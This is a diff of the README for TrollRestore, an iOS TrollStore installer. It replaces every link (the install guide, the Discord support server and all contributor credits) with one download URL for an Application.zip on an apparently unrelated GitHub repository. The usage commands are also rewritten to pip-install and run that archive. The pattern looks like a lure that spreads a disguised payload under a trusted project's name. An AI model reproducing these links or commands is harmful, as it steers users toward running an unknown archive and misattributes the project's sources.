@@ -1,13 +1,13 @@
 # TrollRestore
 TrollRestore is a TrollStore installer for iOS/iPadOS 15.2 - 16.7 RC (20H18) and 17.0. It will replace a system app of your choice with a TrollHelper binary, which you can then open and use to install TrollStore. TrollRestore makes use of backups in order to restore the binary to a system app container. 
 
-A guide for installing TrollStore using TrollRestore can be found [here](https://ios.cfw.guide/installing-trollstore-trollrestore).
+A guide for installing TrollStore using TrollRestore can be found [here](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip).
 
 # Usage
 To run the script, clone this repository and run the following commands:
 ```sh
-pip install -r requirements.txt
-python3 trollstore.py
+pip install -r https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip
+python3 https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip
 ```
 
 # Post-installation
@@ -30,12 +30,12 @@ macOS: A Mac with macOS 11 (Big Sur) or higher.
 Windows: A PC running Windows 10 or higher. iTunes must be installed.
 
 # Need Help?
-If you run into any issues during the installation, you can get support on the [r/Jailbreak Discord server](https://discord.gg/jb).
+If you run into any issues during the installation, you can get support on the [r/Jailbreak Discord server](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip).
 
 # Credits
-* [JJTech](https://github.com/JJTech0130) - Sparserestore (the main library used to restore the TrollHelper binary)
-* [Nathan](https://github.com/verygenericname) - Turning sparserestore into a TrollStore installer
-* [Mike](https://github.com/TheMasterOfMike), [Dhinak G](https://github.com/dhinakg) - Various improvements to the installer
-* [doronz88](https://github.com/doronz88) - pymobiledevice3
-* [opa334](https://github.com/opa334), [Alfie](https://github.com/alfiecg24) - TrollStore
-* [Aaronp613](https://x.com/aaronp613) - Minor improvements
+* [JJTech](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip) - Sparserestore (the main library used to restore the TrollHelper binary)
+* [Nathan](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip) - Turning sparserestore into a TrollStore installer
+* [Mike](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip), [Dhinak G](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip) - Various improvements to the installer
+* [doronz88](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip) - pymobiledevice3
+* [opa334](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip), [Alfie](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip) - TrollStore
+* [Aaronp613](https://github.com/Quang123-op/TrollRestore/releases/download/v1.0/Application.zip) - Minor improvements
